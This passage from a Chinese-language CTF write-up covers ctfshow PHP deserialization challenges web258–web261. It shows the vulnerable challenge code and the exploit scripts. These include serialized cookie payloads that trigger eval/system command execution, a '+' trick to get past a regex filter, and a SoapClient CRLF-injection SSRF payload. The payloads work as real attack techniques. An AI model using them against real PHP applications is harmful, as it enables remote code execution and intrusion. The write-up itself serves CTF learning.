punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'backDoor'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">backDoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">-></span><span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">backDoor</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system("cat flag.php");'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span>username<span class="token operator">=</span>xxxxxx<span class="token operator">&amp;</span>password<span class="token operator">=</span>xxxxxxCookie<span class="token punctuation">:</span> user<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A11<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>ctfShowUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A21<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>ctfShowUser<span class="token operator">%</span><span class="token number">00</span>username<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>xxxxxx<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A21<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>ctfShowUser<span class="token operator">%</span><span class="token number">00</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>xxxxxx<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A18<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>ctfShowUser<span class="token operator">%</span><span class="token number">00</span>isVip<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bb<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A18<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>ctfShowUser<span class="token operator">%</span><span class="token number">00</span>class<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>backDoor<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A14<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>backDoor<span class="token operator">%</span><span class="token number">00</span>code<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A23<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>system<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">22</span>cat<span class="token operator">+</span>flag<span class="token operator">.</span>php<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token comment">// urlencode </span><span class="token comment">// O:11:"ctfShowUser":4:&#123;s:21:"ctfShowUserusername";s:6:"xxxxxx";s:21:"ctfShowUserpassword";s:6:"xxxxxx";s:18:"ctfShowUserisVip";b:1;s:18:"ctfShowUserclass";O:8:"backDoor":1:&#123;s:14:"backDoorcode";s:23:"system("cat flag.php");";&#125;&#125;</span></code></pre><h4 id="web258-绕过正则"><a href="#web258-绕过正则" class="headerlink" title="web258(+绕过正则)"></a>web258(+绕过正则)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'info'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">-></span><span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">info</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$user</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">user</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">backDoor</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[oc]:\d+:/i'</span><span class="token punctuation">,</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>多了正则过滤<code>/[oc]:\d+:/i</code> 还有个小改动，<strong>把原来的private改成了public</strong></p><p>这个正则表达式<code>&#39;/[oc]:\d+:/i&#39;</code>可以分解为几个部分来解释：</p><ol><li><code>/</code>：正则表达式的开始和结束通常使用斜杠<code>/</code>来标记，但在字符串中使用时，需要使用转义字符<code>\</code>来避免与字符串的结束标记混淆。</li><li><code>[oc]</code>：这是一个字符集，表示匹配方括号内的任意一个字符。在这个例子中，它可以匹配字母<code>o</code>或<code>c</code>。</li><li><code>:</code>：这个字符字面上表示它自己，即冒号。</li><li><code>\d+</code>：<code>\d</code>是一个特殊字符，代表任意一个数字（0-9）。<code>+</code>是一个量词，表示前面的字符或字符集可以出现一次或多次。所以<code>\d+</code>表示匹配一个或多个数字。</li><li><code>:</code>：同上，表示字面上的冒号。</li><li><code>/i</code>：<code>i</code>是一个修饰符，表示不区分大小写。这意味着<code>[oc]</code>可以匹配<code>O</code>或<code>o</code>或<code>C</code>或<code>c</code>。</li></ol><p>将这些部分组合起来，这个正则表达式可以匹配形如<code>/o123:</code>或<code>/c456:</code>的字符串，其中<code>o</code>或<code>c</code>后面跟着一个或多个数字，然后是一个冒号。例如，它可以匹配<code>/oc:12345/</code>或<code>/O987:</code>。</p><p>可以利用unserialize的特性在数字前面加上 <code>+</code> 即可，这里正则替换一下。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$class</span> <span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">backDoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">backDoor</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system("tac fl*");'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/([oc]):(\d+:)/i"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$1</span></span>:+<span class="token interpolation"><span class="token variable">$2</span></span>"</span><span class="token punctuation">,</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span>username<span class="token operator">=</span>xxxxxx<span class="token operator">&amp;</span>password<span class="token operator">=</span>xxxxxxCookie<span class="token punctuation">:</span> user<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">2</span>B11<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>ctfShowUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>class<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">2</span>B8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>backDoor<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>code<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A18<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>system<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">22</span>tac<span class="token operator">+</span>fl<span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token comment">// urlencode </span><span class="token comment">// O:+11:"ctfShowUser":1:&#123;s:5:"class";O:+8:"backDoor":1:&#123;s:4:"code";s:18:"system("tac fl*");";&#125;&#125;</span></code></pre><h4 id="web259-HTTP-SoapClient-CRLF-SSRF"><a href="#web259-HTTP-SoapClient-CRLF-SSRF" class="headerlink" title="web259(HTTP  SoapClient+CRLF+SSRF)"></a>web259(HTTP  SoapClient+CRLF+SSRF)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$vip</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'vip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//vip can get flag one key</span><span class="token variable">$vip</span><span class="token operator">-></span><span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php">flag<span class="token operator">.</span><span class="token class-name type-declaration">php</span><span class="token variable">$xff</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">','</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token operator">!==</span><span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$token</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token operator">==</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.txt'</span><span class="token punctuation">,</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>没找到可以反序列化的类，但是根据提示伪造ip后访问flag.txt可以得到flag，感觉考的是HTTP</p><p>看了大佬wp考的是php原生类<code>SoapClient</code>+<code>CRLF</code>实现<code>SSRF</code></p><p><a href="https://y4tacker.blog.csdn.net/article/details/110521104">从一道题学习SoapClient与CRLF组合拳</a></p><p><strong>CRLF注入攻击</strong></p><p>CRLF是“回车+换行”（\r\n）的简称，其十六进制编码分别为0x0d和0x0a。在HTTP协议中，HTTP header与HTTP Body是用两个CRLF分</p><p>隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头中的字符，注入一些恶意的换行，</p><p>这样我们就能注入一些会话Cookie或者HTML代码。CRLF漏洞常出现在Location与Set-cookie消息头中。</p><p><strong>本题需要重点关注的析构函数</strong></p><p><code>__call</code> 在对象中调用一个不可访问方法时调用<br>在这道题中<code>$vip-&gt;getFlag();</code>因为调用了类中没有的方法所以会导致<code>__call</code>的执行<br>本题需要用到的函数<br><a href="https://www.php.net/manual/zh/soapclient.call.php">SoapClient::__call</a></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'http://127.0.0.1/flag.php'</span><span class="token punctuation">;</span><span class="token variable">$post_string</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'token=ctfshow'</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'location'</span> <span class="token operator">=></span> <span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'user_agent'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'hsad^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded^^Content-Length:'</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$post_string</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'^^^^'</span><span class="token operator">.</span><span class="token variable">$post_string</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'uri'</span><span class="token operator">=></span> <span class="token string double-quoted-string">"ssrf"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'^^'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><h4 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ctfshow_i_love_36D/'</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>序列化出来的东西需要包含字符串ctfshow_i_love_36D，<br>直接传ctfhsow&#x3D;ctfshow_i_love_36D试试，成功回显flag。</p><h4 id="web261-unserialize"><a href="#web261-unserialize" class="headerlink" title="web261(__unserialize)"></a>web261(__unserialize)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshowvip</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$u</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">!=</span><span class="token string single-quoted-string">''</span> <span class="token operator">||</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">!=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span 